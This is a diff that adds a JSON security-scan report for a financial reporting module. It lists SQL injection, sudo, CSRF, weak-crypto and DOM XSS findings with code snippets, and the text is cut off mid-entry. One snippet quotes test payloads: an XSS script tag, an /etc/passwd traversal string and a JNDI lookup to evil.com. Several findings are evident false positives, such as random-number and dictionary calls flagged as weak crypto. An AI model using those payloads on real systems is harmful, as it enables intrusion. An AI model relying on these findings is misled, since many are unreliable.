@@ -1,0 +1,1896 @@
+{
+  "module": "",
+  "scan_date": "2025-08-11T18:51:43.962508",
+  "security_score": 0,
+  "total_vulnerabilities": 115,
+  "summary": {
+    "critical": 15,
+    "high": 41,
+    "medium": 58,
+    "low": 1
+  },
+  "vulnerabilities_by_severity": {
+    "critical": [
+      {
+        "file": "tests/test_performance_indexes.py",
+        "line": 83,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "        for index_name in critical_indexes:\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "tests/test_financial_dashboard_wizard.py",
+        "line": 242,
+        "type": "command_injection",
+        "severity": "CRITICAL",
+        "description": "Possible command injection vulnerability",
+        "code_snippet": "\n    def test_dashboard_stats_retrieval(self):\n        \"\"\"Test dashboard statistics retrieval\"\"\""
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 43,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    r'\\.execute\\(f[\"\\']',  # SQL with f-strings\n                    r'SELECT.*FROM.*WHERE.*\\+',  # Direct SQL concatenation\n                ],"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 174,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            try:\n                cur.execute(\"\"\"\n                    SELECT"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 348,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Verificar si el \u00edndice ya existe\n                    cur.execute(\"\"\"\n                        SELECT EXISTS ("
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 360,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Verificar si la tabla existe\n                    cur.execute(\"\"\"\n                        SELECT EXISTS ("
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 384,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    start_time = time.time()\n                    cur.execute(create_query)\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 502,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    for idx_query in mv.get('indexes', []):\n                        cur.execute(idx_query)\n                        self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 410,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                try:\n                    cur.execute(f\"ANALYZE {table}\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 432,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                try:\n                    cur.execute(f\"ALTER SYSTEM SET {param} = '{value}'\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 495,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Crear vista materializada\n                    cur.execute(f\"DROP MATERIALIZED VIEW IF EXISTS {mv['name']} CASCADE\")\n                    cur.execute(mv['query'])"
+      },
+      {
+        "file": "scripts/performance_optimization.py",
+        "line": 506,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "                    # Refrescar vista\n                    cur.execute(f\"REFRESH MATERIALIZED VIEW {mv['name']}\")\n                    self.conn.commit()"
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 52,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            # Verificar si la tabla existe\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 64,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "            # Verificar si el \u00edndice ya existe\n            self.env.cr.execute(\"\"\"\n                SELECT EXISTS ("
+      },
+      {
+        "file": "migrations/18.0.5.0.1/post-add-performance-indexes.py",
+        "line": 109,
+        "type": "sql_injection",
+        "severity": "CRITICAL",
+        "description": "Possible SQL injection vulnerability",
+        "code_snippet": "        try:\n            self.env.cr.execute(sql.SQL(\"ANALYZE {}\").format(sql.Identifier(table)))\n            _logger.info(f\"Estad\u00edsticas actualizadas para {table}\")"
+      }
+    ],
+    "high": [
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 174,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Verificar persistencia\n        param_value = self.env['ir.config_parameter'].sudo().get_param(\n            'account_financial_report.auto_refresh'"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 378,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        for _ in range(100):\n            timeout = self.env['ir.config_parameter'].sudo().get_param(\n                'account_financial_report.cache_timeout'"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 381,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            )\n            batch_size = self.env['ir.config_parameter'].sudo().get_param(\n                'account_financial_report.batch_size'"
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 371,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Test b\u00fasqueda con diferentes usuarios\n        manager_search = self.env['account.trial.balance'].with_user(self.account_manager).search([])\n        user_search = self.env['account.trial.bala"
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 372,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        manager_search = self.env['account.trial.balance'].with_user(self.account_manager).search([])\n        user_search = self.env['account.trial.balance'].with_user(self.account_user).search([])\n  "
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 379,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Usuario b\u00e1sico debe tener acceso muy limitado o nulo\n        basic_search = self.env['account.trial.balance'].with_user(self.basic_user).search([])\n        self.assertEqual(len(basic_search)"
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 391,
+        "type": "path_traversal",
+        "severity": "HIGH",
+        "description": "Possible path traversal vulnerability",
+        "code_snippet": "            \"<script>alert('xss')</script>\",\n            \"../../etc/passwd\",\n            \"${jndi:ldap://evil.com/a}\","
+      },
+      {
+        "file": "tests/test_financial_reports_security.py",
+        "line": 391,
+        "type": "path_traversal",
+        "severity": "HIGH",
+        "description": "Possible path traversal vulnerability",
+        "code_snippet": "            \"<script>alert('xss')</script>\",\n            \"../../etc/passwd\",\n            \"${jndi:ldap://evil.com/a}\","
+      },
+      {
+        "file": "tests/test_performance_indexes.py",
+        "line": 273,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener todas las compa\u00f1\u00edas\n        companies = self.env['res.company'].search([])\n        "
+      },
+      {
+        "file": "tests/test_multi_company_security.py",
+        "line": 82,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            self.user_multi\n        ).search([])\n        "
+      },
+      {
+        "file": "models/financial_dashboard_template.py",
+        "line": 263,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Incrementar contador de uso\n        self.sudo().usage_count += 1\n        "
+      },
+      {
+        "file": "models/financial_dashboard_add_widget_wizard.py",
+        "line": 134,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \"\"\"Return available widget types for the interface\"\"\"\n        return self.env['financial.dashboard.widget'].search([])\n"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 435,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        model_dir = os.path.join(\n            self.env['ir.config_parameter'].sudo().get_param('web.base.url'),\n            'ml_models'"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 519,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde la configuraci\u00f3n\n        impuesto_por_pagar = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_impuesto_renta_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 525,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \n        gasto_impuesto = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_gasto_impuesto_renta_id'"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 501,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde la configuraci\u00f3n\n        iva_por_pagar = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_iva_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 507,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "\n        iva_debito = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_iva_debito_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 481,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas desde configuraci\u00f3n\n        ppm_por_pagar_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_ppm_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 487,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \n        gasto_ppm_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_gasto_ppm_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 588,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener cuentas\n        ppm_por_pagar_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_ppm_por_pagar_id'"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 591,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        )\n        banco_account = self.env['ir.config_parameter'].sudo().get_param(\n            'l10n_cl.account_banco_principal_id'"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 133,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        \"\"\"\n        return self.env['ir.config_parameter'].sudo().get_param(config_key)\n"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 54,
+        "type": "xss",
+        "severity": "HIGH",
+        "description": "Possible XSS vulnerability",
+        "code_snippet": "                    r'document\\.write\\(',  # document.write usage\n                    r'\\|safe(?!\\w)',  # |safe filter in templates\n                ],"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 54,
+        "type": "xss",
+        "severity": "HIGH",
+        "description": "Possible XSS vulnerability",
+        "code_snippet": "                    r'document\\.write\\(',  # document.write usage\n                    r'\\|safe(?!\\w)',  # |safe filter in templates\n                ],"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 258,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "\n                    # Check for .sudo() without proper context\n                    if isinstance(node.func, ast.Attribute):"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 270,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "                                    description='sudo() used without proper context',\n                                    code_snippet='....sudo()'\n                                )"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 141,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Get analysis first\n        analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n        "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 147,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n            "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 223,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Get historical data\n            service = request.env['account.ratio.analysis.service'].sudo()\n            historical_data = service.get_historical_ratios(company_id, ratio_name, periods"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 351,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Check if trained model exists\n            ml_model = request.env['ratio.prediction.ml'].sudo().search([\n                ('company_id', '=', company_id),"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 405,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Get recent analyses with alerts\n            analyses = request.env['account.ratio.analysis.service'].sudo().search([\n                ('company_id', '=', company_id),"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 467,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            analysis = request.env['account.ratio.analysis.service'].sudo().browse(analysis_id)\n            "
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 558,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Store webhook configuration (simplified)\n            config_param = request.env['ir.config_parameter'].sudo()\n            webhook_config = {"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 32,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            # Obtener servicio\n            service = request.env['analytic.report.service'].sudo()\n            "
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 488,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            service = request.env['analytic.report.service'].sudo()\n            result = service.get_project_dashboard_data(project_ids, months)"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 517,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            \n            service = request.env['analytic.report.service'].sudo()\n            result = service.get_analytic_report_data("
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 203,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        # Obtener configuraci\u00f3n de ajustes tributarios\n        ajustes_config = self.env['ir.config_parameter'].sudo()\n        "
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 519,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            cache_param = self.env['ir.config_parameter'].sudo()\n            cached_json = cache_param.get_param(f'sii_cache.{cache_key}')"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 556,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "            \n            cache_param = self.env['ir.config_parameter'].sudo()\n            cache_param.set_param("
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 574,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "        try:\n            cache_param = self.env['ir.config_parameter'].sudo()\n            "
+      },
+      {
+        "file": "migrations/18.0.6.0.0/post-add-mobile-fields.py",
+        "line": 23,
+        "type": "missing_access_control",
+        "severity": "HIGH",
+        "description": "Missing or weak access control",
+        "code_snippet": "    \n    widgets = env['financial.dashboard.widget'].search([])\n    for widget in widgets:"
+      }
+    ],
+    "medium": [
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 174,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 378,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "tests/test_config_fixes_integration.py",
+        "line": 381,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/financial_dashboard_template.py",
+        "line": 263,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 587,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        return {\n            'gdp_growth': np.random.uniform(1.5, 3.5),\n            'inflation_rate': np.random.uniform(1.0, 3.0),"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 588,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            'gdp_growth': np.random.uniform(1.5, 3.5),\n            'inflation_rate': np.random.uniform(1.0, 3.0),\n            'interest_rate': np.random.uniform(2.0, 5.0),"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 589,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            'inflation_rate': np.random.uniform(1.0, 3.0),\n            'interest_rate': np.random.uniform(2.0, 5.0),\n        }"
+      },
+      {
+        "file": "models/ratio_prediction_ml.py",
+        "line": 435,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 519,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f22.py",
+        "line": 525,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 501,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_f29.py",
+        "line": 507,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 481,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 487,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 588,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/l10n_cl_ppm.py",
+        "line": 591,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 90,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        key_str = '|'.join(key_parts)\n        return hashlib.md5(key_str.encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 383,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "\n        return hashlib.md5('|'.join(key_parts).encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/performance_mixin.py",
+        "line": 133,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "scripts/security_vulnerability_scanner.py",
+        "line": 124,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "                'patterns': [\n                    r'csrf=False',\n                    r'@http\\.route.*methods=\\[[^]]*POST[^]]*\\](?!.*csrf)',"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 141,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 147,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 223,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 351,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 405,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 467,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/ratio_analysis_api.py",
+        "line": 558,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 22,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/dashboard/export', type='json', auth='user', methods=['POST'])\n    def export_dashboard(self, layout_id, format='pdf', filters=None, options=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 66,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/widget/export', type='json', auth='user', methods=['POST'])\n    def export_widget(self, widget_id, format='xlsx', filters=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 192,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/apply', type='json', auth='user', methods=['POST'])\n    def apply_template(self, template_id, user_id=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 225,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/create_from_layout', type='json', auth='user', methods=['POST'])\n    def create_template_from_layout(self, layout_id, name, description='', category_id=None, "
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 270,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/rate', type='json', auth='user', methods=['POST'])\n    def rate_template(self, template_id, rating, comment=''):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 347,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/widget/data/lazy', type='json', auth='user', methods=['POST'])\n    def get_widget_data_lazy(self, widget_id, filters=None):"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 32,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 488,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "controllers/analytic_report_controller.py",
+        "line": 517,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 203,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 519,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 556,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/financial_report_sii_service.py",
+        "line": 574,
+        "type": "unsafe_sudo",
+        "severity": "MEDIUM",
+        "description": "sudo() used without proper context",
+        "code_snippet": "....sudo()"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 179,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                codes = month_data.get('codes', {})\n                monthly_totals['sales'] += codes.get('503', 0)\n                monthly_totals['iva_debito'] += codes.get('511', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 180,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['sales'] += codes.get('503', 0)\n                monthly_totals['iva_debito'] += codes.get('511', 0)\n                monthly_totals['iva_credito'] += codes.get('521', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 181,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['iva_debito'] += codes.get('511', 0)\n                monthly_totals['iva_credito'] += codes.get('521', 0)\n                monthly_totals['ppm_paid'] += codes.get('563', "
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 182,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                monthly_totals['iva_credito'] += codes.get('521', 0)\n                monthly_totals['ppm_paid'] += codes.get('563', 0)\n            "
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 186,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            annual_codes = f22_annual_data.get('codes', {})\n            annual_sales = annual_codes.get('629', 0)\n            annual_ppm = annual_codes.get('639', 0)"
+      },
+      {
+        "file": "models/services/sii_integration_service.py",
+        "line": 187,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "            annual_sales = annual_codes.get('629', 0)\n            annual_ppm = annual_codes.get('639', 0)\n            "
+      },
+      {
+        "file": "models/services/financial_dashboard_service_optimized.py",
+        "line": 85,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "        key_str = '|'.join(key_parts)\n        key_hash = hashlib.md5(key_str.encode()).hexdigest()\n"
+      },
+      {
+        "file": "models/services/trial_balance_service.py",
+        "line": 209,
+        "type": "weak_crypto",
+        "severity": "MEDIUM",
+        "description": "Weak cryptographic algorithm detected",
+        "code_snippet": "                if other_code != code and other_code.startswith(code + '.'):\n                    parent_codes.add(code)\n                    break"
+      },
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 335,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 364,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 385,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
